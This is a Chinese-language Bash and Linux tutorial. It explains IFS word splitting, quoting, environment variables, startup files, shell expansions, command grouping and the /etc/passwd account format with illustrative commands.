Bash 会先展开变量，再按照一定的规则分割展开结果。

需要区分的是，命令行中直接输入的空格参与 Bash 的语法解析，而单词分割处理的是变量展开、命令替换等操作产生的结果。它们都可能影响命令最终接收到的参数，但属于不同的处理阶段。

那么，Bash 如何判断应该在哪些字符的位置进行单词分割？

这由一个特殊的 Shell 变量控制：**IFS（Internal Field Separator，内部字段分隔符）**。默认情况下，IFS 包含三个字符：空格、水平制表符（Tab）和换行符（Newline）。可以通过 Bash 的内置命令 `declare` 查看它的实际内容：

```bash
$declare -p IFS
declare -- IFS=$' \t\n'
```

其中，`$'...'` 是 Bash 用于表示特殊字符的一种引用形式。这里的空格表示普通空格，`\t` 表示水平制表符，`\n` 表示换行符。如果直接执行：

```bash
$echo "$IFS"

```

通常只能看到空白内容，难以判断变量究竟包含哪些字符。这是因为 IFS 默认保存的就是空白字符。

IFS 也可以像普通 Shell 变量一样修改，但不建议。

虽然 IFS 可以包含多个分隔字符，但 Bash 并不是简单地在每个分隔字符处切开文本。实际的分割行为取决于分隔字符的类型。

Bash 将 IFS 中的空格、水平制表符和换行符称为 **IFS 空白字符（IFS Whitespace）**。对于这些字符，Bash 会忽略展开结果开头和结尾连续的 IFS 空白字符，并将中间连续的 IFS 空白字符作为一个分隔区域。例如，在默认 IFS 下：

```bash
$text="  Linux   Bash  "
$echo $text
```

变量展开后，开头和结尾的空格被忽略，中间连续的三个空格被视为一个分隔区域。因此，Bash 最终向 `echo` 传递两个参数：`Linux` 和 `Bash`。

如果 IFS 包含非空白字符，例如冒号 `:`，规则就有所不同。

```bash
$IFS=:
text="Linux::Bash"
```

此时，两个连续的冒号不会被合并成一个分隔区域，而是会在它们之间产生一个空字段。因此，未加引号的 `$text` 展开后会形成三个字段：

```text
Linux
（空字段）
Bash
```

如果非空白分隔字符旁边还有属于 IFS 的空白字符，Bash 会将这些相邻的空白字符与该非空白分隔字符一起视为一个字段分隔区域。

还需要注意以下两种特殊情况：

- 当 `IFS` 被设置为空字符串时，Bash 不会使用 IFS 对展开结果进行单词分割。
- 当 `IFS` 未设置时，Bash 使用默认的空格、制表符和换行符分割规则。

因此，**IFS 不只是指定分隔符是什么，还会影响连续分隔符和空字段的处理方式**。

这些规则适用于 Bash 的单词分割过程，并不意味着它会按照 IFS 重新解析整条命令行。例如，即使将 `IFS` 修改为冒号，直接输入的命令：

```bash
ls -l /home
```

仍然会按照 Bash 的正常语法识别命令及其参数。

### 反斜杠与字符转义

当反斜杠位于单引号和双引号之外时，它通常会取消紧随其后字符的特殊含义，使该字符按照字面含义处理。,例如反斜杠使 `$` 不再被解释为变量引用的起始符号：

```bash
$echo \$HOME
$HOME
```

再比如这里的反斜杠使空格不再作为参数分隔符，因此整个内容仍然属于一个参数：

```bash
$echo hello\ world
hello world
```

反斜杠还可以用于处理文件名中的特殊字符。例如，当前目录存在一个名称为 `file*.txt` 的文件，可以这样访问，这里的 `\*` 表示普通星号，而不是通配符：

```bash
$ls file\*.txt
```

反斜杠紧接换行符时属于一种特殊情况：Bash 会移除反斜杠和换行符，将命令视为尚未结束。这种写法常用于将一条较长的命令分成多行：

```bash
$echo hello \
world
```

与单引号不同，双引号允许变量展开、命令替换和算术展开，因此其中的部分字符仍然具有特殊含义。

在通常的 Bash 双引号语法中，反斜杠只有位于以下字符之前时才具有特殊的转义作用：

| 字符             | 作用                         |
| ---------------- | ---------------------------- |
| $                | 表示字面的 `$`，阻止变量展开 |
| `                | 表示字面的反引号             |
| "                | 表示字面的双引号             |
| \                | 表示字面的反斜杠             |
| 反斜杠紧接换行符 | 续行，移除反斜杠与换行符     |

> [!NOTE]
>
> 所有符号在单引号之内都是原样交给命令，shell不会先做处理！

### 引号拼接

在实际使用中，有时一段文本需要同时包含普通字符、变量展开和特殊字符。这时不一定需要将整个内容放进同一种引号中。Bash 允许将相邻的多个引用片段拼接成一个参数。

例如外层使用双引号，因此 `$name` 可以展开；其中的单引号只是普通字符：

```bash
$name=Linux

$echo "Hello, '$name'"
Hello, 'Linux'
```

再比如这条命令实际上由三个相邻片段组成,Bash 会将它们拼接成一个完整参数：

```bash
$echo 'Hello, '"$name"'!'
Hello, Linux!
```

如果需要在单引号保护的文本中包含单引号，也可以使用相同的拼接机制：

```bash
$echo 'It'\''s Linux'
It's Linux
```

最后，还需要明确一个细节。引号的作用是告诉 Bash 如何解释字符，而不是将引号本身传递给命令。引号的作用是告诉 Bash 如何解释字符，而不是将引号本身传递给命令。双引号在 Bash 完成相应处理后会被移除。这也解释了为什么下面两条命令得到的输出相同：

```bash
$echo hello
$echo "hello"
```

## 环境变量与变量导出

每个进程在内存中维护一份环境列表（environment list），列表内以 name=value 的形式组织，内容可由应用自定义；列表中每一组 name=value 键值对称为环境变量（environment variables）。可以使用`env` 命令或者`printenv`命令：

```bash
$env
SHELL=/bin/bash
HOME=/home/bob
...省略...
```

也可以使用printenv 命令或者echo 命令查看单个变量：

```bash
$printenv SHELL
/bin/bash

echo $SHELL
/bin/bash
```

父进程创建子进程时，子进程继承父进程环境的副本。父、子进程都可以**独立修改各自的环境变量**。

用户自己在shell中定义的变量，子进程不会继承，如果需要传递给子进程，需要使用 `export` 命令，可以在定义变量后，再使用 `export` 命令导出变量，也可以直接定义时导出：

```bash
$NEWNAME=bob
$export NEWNAME

$export NEWNAME=bob
```

取消导出可以使用`-n` 选项：

```bash
$export -n NEWNAME
```

注意`unset`命令也可以取消导出，但它会将变量从当前shell中删除。`set` 命令也可以查看当前进程中所有的变量，包括导出变量，环境变量和用户定义的变量还有一些函数。

Shell 和外部程序还会使用许多环境变量。它们的值可能来自登录程序、系统配置文件、父进程，也可能由用户自行设置：

| 变量               | 含义                                 |
| ------------------ | ------------------------------------ |
| `PATH`             | 外部命令搜索路径，冒号分隔目录       |
| `HOME`             | 当前用户主目录                       |
| `SHELL`            | 用户默认 shell（仅标识，不切换进程） |
| `USER` / `LOGNAME` | 当前登录用户名                       |
| `LANG` / `LC_ALL`  | 区域、语言、字符编码                 |
| `PWD`              | 当前工作目录（bash 维护）            |
| `OLDPWD`           | 上一次的工作目录                     |
| `TERM`             | 终端类型，控制色彩、光标能力         |
| `EDITOR`           | 默认文本编辑器                       |
| `PS1`              | 主提示符                             |
| `PS2`              | 换行续行提示符                       |
| `IFS`              | 内部字段分隔符                       |
| `TMPDIR`           | 临时目录，很多程序优先读取           |
| `LD_LIBRARY_PATH`  | 动态库搜索路径                       |

| 变量             | 作用                                                         |
| ---------------- | ------------------------------------------------------------ |
| `HISTFILE`       | 历史文件路径，                                               |
| `HISTSIZE`       | 内存里本次会话最多缓存多少条历史                             |
| `HISTFILESIZE`   | 磁盘上历史文件最大行数，退出时截断                           |
| `HISTCONTROL`    | 过滤策略：ignoredups（去连续重复）、ignorespace（空格开头不存）、ignoreboth、erasedups（删掉全部旧重复） |
| `HISTIGNORE`     | 冒号分隔，匹配到的命令直接不进历史（ls:pwd:clear）           |
| `HISTTIMEFORMAT` | 时间戳格式；设置后 history 带时间，写入文件时附带时间标记    |
| `HISTCMD`        | 当前这条命令在历史列表里的序号（只读）                       |

### 外部命令的搜索路径

前面已经知道，`cd` 属于 Bash 内置命令，而 `ls` 是文件系统中的独立可执行程序。我们并没有指定 /usr/bin/ls，但 Bash 通常仍然能够找到它。这是因为 Bash 使用 `PATH` 环境变量保存外部可执行程序的搜索目录。可以查看它的值：

```bash
$echo  $PATH
/home/bob/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
```

这些路径由冒号 `:` 分隔，当 Bash 需要通过 `PATH` 查找外部程序时，会按照目录的排列顺序寻找对应的可执行文件，找到合适的可执行文件后，便可以执行它。如果希望把自己的可执行程序目录加入搜索路径，可以执行：

```bash
$export PATH="$HOME/bin:$PATH"
```

这条赋值并没有删除原来的搜索目录，而是把 `$HOME/bin` 放在原有 `PATH` 的前面。

目录顺序非常重要。假设两个目录中存在同名可执行文件，**Bash 按照搜索规则通常会优先使用前面目录中的程序**。因此，不应随意将不可信的目录放在系统目录之前。

## Bash 的启动与配置文件

前面已经介绍了 Bash 如何通过 `export` 命令向子进程传递环境变量，以及 Bash 在启动时如何接收父进程提供的环境。但是，如果退出当前登录会话，之后重新登录系统，这些导出的变量就没有了。

`export` 命令只修改当前 Bash 的变量属性，并不会自动将设置保存到磁盘。新的登录会话会重新建立运行环境，为了让某些设置能够在每次启动 Bash 时自动生效，Bash 提供了启动配置文件机制。

这些文件中可以保存变量赋值、`export`命令、别名定义等命令。Bash 启动时，根据自身的启动方式读取相应的文件，并执行其中的命令，从而建立所需的运行环境。

不过，Bash 并不会在每次启动时都读取同一组配置文件。要理解它的加载规则，首先需要区分两种相互独立的启动属性：登录模式与交互模式。

### 登录 Shell 的配置文件

当 Bash 以通常的登录模式启动时，会尝试读取系统级启动文件**/etc/profile**，通常由系统管理员维护，可以用于设置登录 Shell 所需的公共环境。

如果文件存在，Bash 会读取并执行其中的命令。随后，Bash 会按照以下**顺序检查**当前用户家目录中的配置文件：

```text
~/.bash_profile
~/.bash_login
~/.profile
```

Bash 会读取**第一个存在且可读取的文件**，而不是依次执行全部三个文件。例如，假设用户的家目录中同时存在：

```text
/home/alice/.bash_profile
/home/alice/.profile
```

那么，按照上述规则，Bash 会优先读取 .bash_profile，不会再自动读取 .profile。

这里需要区分系统级与用户级配置：/etc/profile 面向使用相应启动机制的 Shell，而家目录中的文件属于对应用户自己的配置。

某些 Linux 发行版还会通过 /etc/profile 读取 **/etc/profile.d/** 目录中的其他配置文件。但这是由 /etc/profile 内部的命令实现的，并不是 Bash 自动读取该目录下的所有文件。

登录 Shell 退出时，Bash 在符合条件的情况下还会读取：~/.bash_logout文件，这个文件可用于执行退出时的清理操作，但并不是每一种 Bash 退出方式都会读取它。

### 交互式非登录 Shell 的配置文件

登录 Bash 有自己的配置文件，那么在终端中直接执行bash 命令，启动的交互式非登录 Bash 又会读取什么文件？

对于这种启动方式，Bash 通常读取当前用户家目录中的**.bashrc**文件，.bashrc 是 Bash 最常见的用户级交互配置文件。例如，可以在其中定义命令别名，当新的交互式非登录 Bash 读取 .bashrc 后即可使用这个命令别名。

### 非交互式 Bash 的启动配置

前面已经介绍过：

```bash
bash -c 'echo Hello'
```

会启动新的 Bash，执行指定命令，然后退出。这种普通的非交互式 Bash 不会按照交互式非登录 Bash 的规则自动读取 ~/.bashrc。不过，Bash 提供了 `BASH_ENV` 环境变量，用于指定非交互式 Bash 启动时需要读取的文件。例如：

```bash
export BASH_ENV="$HOME/bash-env"
```

当后续启动普通非交互式 Bash 时，它会检查继承的 `BASH_ENV`，并按照相应规则读取该变量指定的文件。

但应当注意，非交互式 Bash 与登录模式可以同时存在。如果显式使用 `--login`，Bash 仍然会按照登录模式尝试读取相应的登录配置文件。

### source命令

我们已经知道 Bash 可以在启动时读取配置文件。但如果在命令行中修改了配置文件，并立即生效，需要使用 `source` 内置命令在**当前 Shell 中**读取并执行指定文件中的命令。

shell 的配置文件（.bashrc / .bash_profile）本质就是一堆提前写好的 shell 命令：

```bash
$source "$HOME/.bashrc"
```

`source` 还有一种等价的写法：

```bash
. "$HOME/.bashrc"
```

这里的 `.` 是 Bash 内置命令，后面需要与文件路径之间保留空格。

## 快捷键

在交互式模式下，Bash 不仅负责解释和执行命令，还需要接收用户输入，并提供必要的命令行编辑功能。例如，输入一条较长的命令后，如果发现开头的路径有误，我们不必删除整行重新输入。Bash 允许用户移动光标、修改已有内容、调用历史命令，以及自动补全命令和路径。

### 光标移动

可以使用方向键逐字符移动光标，也可以使用快捷键直接跳转。常见的光标移动快捷键如下：

| 快捷键 | 作用                 |
| ------ | -------------------- |
| Ctrl+A | 移动到当前命令行开头 |
| Ctrl+E | 移动到当前命令行末尾 |
| Ctrl+B | 向左移动一个字符     |
| Ctrl+F | 向右移动一个字符     |
| Alt+B  | 向左移动一个单词     |
| Alt+F  | 向右移动一个单词     |

### 删除与恢复输入内容

| 快捷键 | 作用                         |
| ------ | ---------------------------- |
| Ctrl+D | 删除光标所在位置的字符       |
| Ctrl+H | 删除光标前的一个字符         |
| Ctrl+W | 删除光标前的一个单词         |
| Alt+D  | 删除光标后的一个单词         |
| Ctrl+U | 删除从光标到命令行开头的内容 |
| Ctrl+K | 删除从光标到命令行末尾的内容 |
| Ctrl+Y | 恢复最近被剪切的文本         |

 Ctrl+U、Ctrl+K 等操作称为 **Kill**，即剪切文本，而不是简单地丢弃内容。被剪切的文本通常会保存在 剪切缓冲区中。Ctrl+U清除输入后，如果希望恢复刚才的内容，可以按下Ctrl+Y，这种恢复操作称为 **Yank**。

### 取消当前输入与控制信号

在通常的终端配置下：

- Ctrl+C 使终端向前台进程组发送 SIGINT 信号。
- Ctrl+Z 使终端向前台进程组发送 SIGTSTP 信号。
- Ctrl+D 通常表示输入结束；它并不是一个信号。

当 Bash 正在命令提示符处等待输入时，按下 Ctrl+C 通常可以取消当前尚未执行的输入，重新显示命令提示符。而当 Bash 正在执行一个前台程序时，Ctrl+C 通常会影响该程序所在的前台进程组。

对于 Ctrl+D，需要根据当前输入状态判断其行为。如果命令行中已有字符，且光标下还有字符，Ctrl+D 通常解释为删除光标处的字符。如果当前命令行为空，在通常设置下按下 Ctrl+D 会使 Bash 接收到输入结束的指示，并可能退出当前交互式 Shell。

### 命令历史

| 快捷键 | 作用                   |
| ------ | ---------------------- |
| Ctrl+P | 调出上一条历史命令     |
| Ctrl+N | 调出下一条历史命令     |
| ↑      | 通常调出上一条历史命令 |
| ↓      | 通常调出下一条历史命令 |

历史命令被调出后，并不会立即执行。它只是重新出现在当前命令行中。

### 搜索历史命令

当历史记录较多时，反复按上方向键查找效率很低。可以使用Ctrl+R 进入历史搜索模式。按下 Ctrl+R 后，命令行通常会显示类似：

```text
(reverse-i-search)`':
```

此时输入想搜索的字符，如果找到匹配项，命令行通常会显示对应的历史命令。继续按下 Ctrl+R，可以查找更早的匹配记录。找到目标命令后，可以按右方向键或 Ctrl+E，将匹配结果保留在命令行中继续编辑；也可以直接按回车执行。如果不想继续搜索，可以按下 Ctrl+G 取消搜索，恢复进入搜索之前的命令行状态。

## Shell 展开

前面介绍 Bash 变量时，我们已经学会通过 `$name` 或 `${name}` 引用变量。例如：

```bash
name=Linux
echo "$name"
```

执行后，`echo` 输出的是 `Linux`，而不是 `$name`。这是因为 Bash 在执行 `echo` 之前，已经将变量引用替换成了变量的实际值。这种处理称为**展开（Expansion）**。

变量引用只是 Bash 展开机制的一部分。除了读取变量，Bash 还可以在执行命令之前生成一组字符串、获取其他命令的输出，以及计算算术表达式。

### 参数展开

在 Bash 中，通过 `$` 引用变量的过程，属于**参数展开（Parameter Expansion）**。

这里需要明确一个术语：Bash 将能够保存或提供值、并可通过相应语法引用的对象统称为参数。普通变量属于具有名称的参数，前面已经接触过的 `$?`、`$$` 等则属于特殊参数。“参数展开”不仅包括普通变量的展开，也包括位置参数与特殊参数的展开。

#### 未设置变量与空变量

变量可以处于未设置状态，也可以已经定义但值为空。这两种状态在普通变量引用时往往不容易区分，但在某些参数展开形式中具有不同含义。Bash 提供了以下语法：

```bash
${name:-value}
```

如果 `name` 未设置或者值为空，就使用 `value` 作为展开结果。例如：

```bash
$unset name
$echo "${name:-guest}"
guest
```

如果变量已经具有非空值：

```bash
$name=Linux
$echo "${name:-guest}"
Linux
```

这里要注意，`${name:-vulue}` 只是决定本次展开使用什么内容，并不会因此修改变量本身。

如果希望变量未设置或为空时，同时为它赋予默认值，可以使用：

```bash
unset name
echo "${name:=guest}"
echo "$name"
```

两次都会输出 guest。第一条 `echo` 执行前，Bash 不仅将展开结果设为 guest，还把 guest 保存到了变量 name 中。

Bash 还提供其他几种相关形式：

| 形式            | 作用                                      |
| --------------- | ----------------------------------------- |
| `${name:-word}` | 未设置或为空时，使用 `word`               |
| `${name:=word}` | 未设置或为空时，赋值并使用 `word`         |
| `${name:+word}` | 已设置且非空时，使用 `word`；否则展开为空 |
| `${name:?word}` | 未设置或为空时，报告错误信息              |

其中，冒号 `:` 具有特殊意义：它使判断同时考虑**未设置**和**空字符串**两种情况。如果省略冒号，例如：

```bash
${name-word}
```

那么只有变量未设置时才使用 word。如果变量已经设置为空字符串，展开结果仍然为空。

#### 获取字符串长度

参数展开还可以用于获取变量值的长度。例如：

```bash
name=Linux
echo "${#name}"
5
```

需要注意，这里说的是 Bash 根据当前字符编码与区域设置计算的字符长度，不一定等于字符串在内存中占用的字节数。

### 命令替换

参数展开能够取得变量中已经保存的值。如果希望将另一条命令的执行结果用于当前命令，又应该怎样处理？例如，我们希望把当前工作目录保存到一个变量中。之前已经学习过 `pwd`：

```bash
$pwd
/home
```

它会将当前工作目录输出到标准输出。但是，直接执行：

```bash
$directory=pwd
```

只会将字符串 pwd 赋给变量，而不会执行 `pwd` 命令。

为此，Bash 提供了**命令替换（Command Substitution）**，基本形式是：`$(command)`。

Bash 先会创建子进程，在子 shell 里面执行括号内部的命令，捕获它的**标准输出（stdout）**，然后把输出拿来替换掉整段 `$(...)`；最后再继续执行外层命令:

```bash
$directory=$(cd /tmp; pwd)

$echo "$directory"
/tmp

$pwd
/home
```

命令替换捕获的是命令的**标准输出（stdout）**，而不是命令执行过程中产生的全部信息。如果命令产生错误信息，并将错误信息写入标准错误（stderr），这些信息默认不会被命令替换捕获，而是仍然通过标准错误输出。想要连 stderr 一起捕获需要重定向 `2>&1`。

Bash 会删除命令替换结果末尾连续的换行符，字符串中间的换行保留不动。

`$(...)` 允许嵌套使用，也就是在一个命令替换中包含另一个命令替换:

```bash
$parent=$(dirname "$(pwd)")
```

Bash 会先处理内部的 $(pwd)，将其结果作为 `dirname`命令 的参数，再取得外部命令替换的输出。`dirname` 是一个外部程序，它根据输入的路径文本计算目录部分，并不检查路径所指向的文件是否真实存在。

除了 `$()`，Bash 还支持较早的反引号形式：

```bash
$directory=`pwd`
```

它同样表示命令替换,但反引号中的反斜杠规则较为特殊，而且嵌套时需要额外处理，因此现代 Bash 命令通常更推荐使用前一种写法。

###  算术展开

除了获取变量值和命令输出，Bash 还可以在展开过程中计算整数表达式。

这种操作称为**算术展开（Arithmetic Expansion）**，使用`$((expression))`，例如：

```bash
$count=10
$echo "$((count + 5))"
15
```

Bash 首先计算 `count + 5`，再把计算结果作为 `echo` 的参数。

算术展开支持常见的整数运算：

| 运算符 | 含义     |
| ------ | -------- |
| +      | 加法     |
| -      | 减法     |
| *      | 乘法     |
| /      | 整数除法 |
| %      | 取余     |
| **     | 幂运算   |

Bash 算术运算主要使用固定宽度整数。8 / 3 的结果为 2，不会自动得到浮点数 2.666...。算术表达式还可以使用括号改变运算优先级：

```bash
$echo "$((2 + 3 * 4))"
14

$echo "$(((2 + 3) * 4))"
20
```

### 花括号展开

Bash 还提供一种直接生成多个字符串的机制，称为**花括号展开（Brace Expansion）**。例如将花括号中的内容依次与前后的字符串组合，产生多个独立的单词：

```bash
$echo file{1,2,3}.txt
file1.txt file2.txt file3.txt
```

花括号展开还可以用于生成范围：

```bash
$echo {1..5}
1 2 3 4 5
```

也可以生成字母序列：

```bash
$echo {a..e}
a b c d e
```

如果需要指定递增步长，可以使用：

```bash
$echo {1..10..2}
1 3 5 7 9
```

### 波浪号展开

在使用 Linux 时，我们经常通过 `~` 表示当前用户的家目录。这是因为 Bash 支持**波浪号展开（Tilde Expansion）**。在符合语法条件的位置，未被引用的 `~` 会被展开为相应的目录路径:

```bash
$echo ~
/home/alice
```

也可以指定用户名:

```bash
$echo ~root
/root
```

此外，Bash 还提供两个与工作目录有关的波浪号形式：

```bash
echo ~+
echo ~-
```

其中，`~+` 通常表示当前工作目录，`~-` 通常表示上一次工作目录。

### 展开顺序

前面分别介绍了参数展开、命令替换、算术展开、花括号展开和波浪号展开。但在一条命令中，它们可能同时出现。Bash 必须按照明确的规则进行处理，才能确定最终的命令内容。根据 Bash 的展开规则，主要处理顺序可以概括为：原始命令文本 → 语法识别与单词划分 → 花括号展开 → 波浪号展开、参数展开、命令替换、算术展开 → 单词分割 → 文件名展开 → 引号移除 → 执行命令。

这里有几个需要明确的细节：

首先，花括号展开发生在参数展开之前。其次，波浪号展开、参数展开、命令替换和算术展开在相应阶段按照从左到右的顺序处理。嵌套表达式还需要先计算内部所依赖的内容。

单词分割与文件名展开并不对所有展开结果无条件执行。它们受到引号、赋值语法和其他上下文规则的影响。

最后，引号移除发生在展开处理的后期。这里的引号移除，是指 Bash 删除原始命令中承担引用作用的引号及相关转义字符，而不是删除展开结果中实际存在的普通引号字符。

###  文件名展开与通配符

文件名展开（Filename Expansion），也称为路径名展开（Pathname Expansion）。其中使用的匹配模式通常称为通配符模式（Glob Pattern），整个匹配过程也常称为 Globbing。

在文件名匹配模式中，`*` 可以匹配任意长度的字符序列，包括零个字符。问号 `?` 则用于匹配恰好一个字符。`?` 匹配的是单个字符，并不要求该字符一定是数字或字母。方括号表达式（Bracket Expression）用于在指定字符集合中匹配一个字符。

在 Bash 默认的文件名展开设置下，普通的 `*` 不会匹配名称以 `.` 开头的隐藏文件。如果希望通过模式匹配隐藏文件，可以显式包含开头的点：

```bash
$ls .*
```

但使用这个模式时，还需要考虑 `.` 和 `..`。它们分别表示当前目录和父目录，在现代 Bash 的常见默认设置下，`globskipdots` 会使文件名展开跳过 `.` 和 `..`。Bash 提供 `dotglob` 选项，可以改变普通通配符对隐藏文件的匹配行为。执行：

```bash
shopt -s dotglob
```

启用后，普通通配符也可以匹配符合模式的隐藏文件，但 `.` 和 `..` 仍受到专门规则限制。

如果希望恢复默认的隐藏文件匹配行为，可以执行：

```bash
shopt -u dotglob
```

###  变量展开与文件名展开

如果一个变量展开的结果中包含通配符字符，并且没有被双引号保护，那么这些字符仍然可能参与后续的文件名展开。

例如这里使用单引号，使赋值时的星号作为普通字符保存到变量中。：

```bash
$pattern='*.log'
```

随后执行：

```bash
$ls $pattern
```

Bash 首先将 `$pattern` 展开为：

```text
*.log
```

由于变量引用没有被双引号保护，展开结果可能继续经历单词分割和文件名展开。因此，如果当前目录存在符合条件的日志文件，这条命令就会匹配这些文件。这也是为什么在 Bash 中，一般应当为变量引用添加双引号。

## 命令组合

前面介绍的命令大多是独立执行的。例如，使用 `ls` 查看目录内容，使用 `grep` 搜索文本，或者使用 `sort` 对数据进行排序。

但在实际操作中，一项任务通常无法只依靠一条命令完成。有时需要先执行一条命令，再根据执行结果决定是否继续；有时需要将前一条命令产生的数据交给另一条命令处理；还有时需要将命令输出保存到文件，而不是直接显示在终端中。

Bash 为这些需求提供了命令列表、条件执行、管道以及输入输出重定向等机制。它们与前面介绍的 Shell 展开有所不同。展开主要决定命令执行时获得哪些参数，而本节讨论的是：多条命令如何组织、何时执行，以及执行过程中数据如何流动。

###  命令的退出状态

要让 Bash 根据上一条命令的执行结果决定下一步操作，首先需要知道它如何判断命令是否成功。在 Linux 中，程序结束运行时，可以向操作系统返回一个退出状态（Exit Status）。Bash 执行命令后，也会得到相应的退出状态。按照通常的约定：

- 0 表示命令执行成功。
- 非零值表示命令执行失败，或者出现了其他需要报告的状态。

Bash 通过特殊参数 `$?` 保存最近一个前台管道的退出状态。对于单条命令，它表示刚执行完成的命令状态。默认情况下管道整体的退出状态通常由最后一条命令决定。

### 命令的顺序执行

通常情况下，用户输入一条命令并按下回车，Bash 会执行该命令，等待它完成，然后继续读取后续命令。例如：

```bash
$pwd
$date
```

这里包含两条依次执行的命令。如果希望将多条命令写在同一行，可以使用分号 `;`：

```bash
$pwd; date
```

分号用于分隔命令，使 Bash 按顺序执行它们。需要注意，**分号只负责分隔命令，并不要求前面的命令执行成功。**

### 条件执行：&& 与 ||

Bash 提供 `&&` 和 `||`，根据前一条命令的退出状态决定是否执行后一条命令。

`&&` 表示：只有左侧命令执行成功，才执行右侧命令。例如：

```bash
$cd /etc && pwd
```

Bash 先执行 `cd /etc`。如果成功，当前工作目录已经切换到 `/etc`，随后执行 `pwd`。如果 `cd /etc` 失败，Bash 就不会执行右侧的 `pwd`。这一点在连续执行具有依赖关系的命令时尤其重要。

与 `&&` 相反，`||` 表示只有左侧命令执行失败，才执行右侧命令，例如：

```bash
$cd /not-exist || echo "目录不存在"
```

由于 `cd` 失败，Bash 会继续执行右侧的 `echo`。如果目录存在，`cd` 执行成功，右侧命令就不会执行。因此，`||` 常用于失败后的错误提示或其他处理操作。

`&&` 和 `||` 可以连接多条命令,具有相同的优先级，并按照从左到右的顺序结合。

### 命令分组

有时我们希望将多条命令作为一个整体处理。例如，希望先进入某个目录，再执行两条命令，并让这组操作与外部环境相互隔离。

Bash 提供了**命令分组（Command Grouping）**机制，主要有两种形式：

```bash
( command1;command2 )
或
(
command1
command2
)
```

以及：

```bash
{ command1;command2; }
或
{
command1
command2
}
```

(commands) 语法上不强制空格；{ commands; } 单行书写必须注意空格隔开第一个{，命令最后需要添加分号和空格来隔开后面的}。

这两种语法都能够组织多条命令，但它们在执行环境上存在重要区别：

- 圆括号会使其中的命令在子 Shell 环境中执行，可以继承当前 Bash 的普通变量。
- 花括号不会创建子 Shell，直接在当前 Shell环境中执行。

命令分组的另一个用途，是让多条命令共同使用同一组输入输出配置。例如，希望把当前日期、主机名和内核信息保存到一个文件中：

```bash
${
    date
    hostname
    uname -a
} > system-info.txt

$(
 	date
    hostname
    uname -a
) > system-info.txt

$(date;hostname;uname -a)> system-info.txt
```

命令分组还可以与管道组合，将整个命令组的标准输出通过管道传递给 `sort`命令：

```bash
{ echo Linux;echo Bash; } | sort
```

# 用户、用户组

Linux 是一个多用户操作系统。同一台机器上可以存在多个用户，他们可以拥有各自的文件、运行各自的程序，也可能同时访问系统中的公共资源。

这就产生了一个问题：**当不同用户尝试访问同一个文件或执行某项操作时，Linux 如何区分他们的身份？**

事实上，Linux 并不直接根据终端中输入的用户名决定操作权限。对于大多数文件访问和特权操作，内核需要检查的是发起操作的进程所具有的身份凭据。

在前面的进程章节中，我们已经接触过用户 ID（UID）和组 ID（GID）。它们并不是单纯用于显示进程属于哪个用户，而是 Linux 权限管理机制的重要组成部分。

例如，两个进程即使执行相同的程序、访问相同的文件，也可能因为具有不同的 UID、GID 和其他凭据而得到不同的结果。

那么，这些数字形式的身份标识与我们熟悉的用户名之间有什么关系？系统又是如何记录用户账户、管理用户组，并在用户登录后为进程建立相应身份的？

要理解这些问题，我们需要先从 Linux 的用户身份模型入手，再进一步介绍账户信息的保存、用户组的组织方式，以及用户账户的创建与管理。

## Linux 用户账户

Linux 安全系统的核心是用户账户。每个能访问Linux系统的用户都会被分配一个唯一的用 户账户。用户对系统中各种对象的访问权限取决于他们登录系统时所用的账户。用户权限是通过创建用户时分配的用户ID（user ID，UID）来跟踪的。UID是个数值，每个 用户都有一个唯一的UID。但用户在登录系统时是使用登录名（login name）来代替UID登录的。 登录名是用户用来登录系统的最长8字符的字符串（字符可以是数字或字母），同时会关联一个对应的密码。 

### /etc/passwd 文件

Linux 系统使用一个专门的文件/etc/passwd来匹配用户名与对应的UID值。该文件包含了一 些与用户有关的信息，可以直接查看该文件的内容：

```bash
$cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
alice:x:1000:1000:Alice:/home/alice:/bin/bash
```

/etc/passwd 文件中的每一行都描述了一个账户，并通过冒号 `:` 分隔不同字段，可以得到七个字段：

```text
alice : x : 1000 : 1000 : Alice : /home/alice : /bin/bash
  │     │     │      │      │          │            │
  │     │     │      │      │          │            └── 登录 Shell
  │     │     │      │      │          └─────────────── 家目录
  │     │     │      │      └────────────────────────── 账户描述信息
  │     │     │      └───────────────────────────────── 主组 GID
  │     │     └──────────────────────────────────────── UID
  │     └────────────────────────────────────────────── 密码字段
  └──────────────────────────────────────────────────── 用户名
```

各字段含义如下：

| 字段             | 示例        | 说明                                 |
| ---------------- | ----------- | ------------------------------------ |
| 用户名           | alice       | 账户名称                             |
| 加密后的密码字段 | x           | 通常表示密码散列信息保存在其他文件中 |
| UID（用户id）    | 1000        | 用户的数字身份标识                   |
| GID（主组id）    | 1000        | 用户的主要组 ID                      |
| 账户描述         | Alice       | 用户的描述信息，也称 GECOS 字段      |
| 家目录           | /home/alice | 用户登录后通常使用的家目录           |
| 登录 Shell       | /bin/bash   | 账户配置的登录 Shell                 |

用户名（也称为 “登录名”）必须是唯一的，取决于具体的操作系统，可能还会有字符集方面的限制。所有的 UNIX 和 Linux 目前都将登录名的长度限制在 32 个字符。登录名绝不能包含冒号或换行符，因为在 passwd 文件中，这两种字符分别被作为字段分隔符和条目分隔符。依据系统的不同，也许存在其他的字符限制。

密码字段都被设置为x，表示密码保存在/etc/shadow文件中。早期/etc/passwd 文件包含经过加密的用户密码，但/etc/passwd 文件可以被任何人读取，并且古老的加密算法加上现代化的设计，使得密码破解更加容易。Debian / Ubuntu系列默认的密码算法配置文件在/etc/pam.d/common-password（优先级高）和/etc/login.defs中；RHEL / CentOS / Rocky / AlmaLinux可以只用authconfig 命令修改密码算法，同时支持/etc/login.defs文件。

超级用户的UID始终为0，通常用户名对应为root，拥有完整超级权限，在 Linux 内核层面没有权限隔离，几乎不受系统权限检查限制，是这台主机的最高主体。，Linux系统会为各种各样的功能创建不同的用户账户，而这些账户并非真正的人类用户。我们称其为系统账户，它们是系统中运行的各种服务进程访问资源使用的特殊账 户。早期 RedHat 系默认把 0–499 留给系统账号，普通用户从 500 起分配；现代绝大多数发行版（Ubuntu、Debian、RHEL7+）改为预留 0–999，普通用户默认从 1000 开始，全部由 /etc/login.defs 的 UID_MIN 控制。

主组（primary group）是用户登录时默认生效的组身份，组权限允许多个用户对系统对象（比如文件、目录或设备等）共享一组权限，和 UID 类似，规范管理下每个组拥有唯一的 GID，组名在 /etc/group 中也保持唯一。

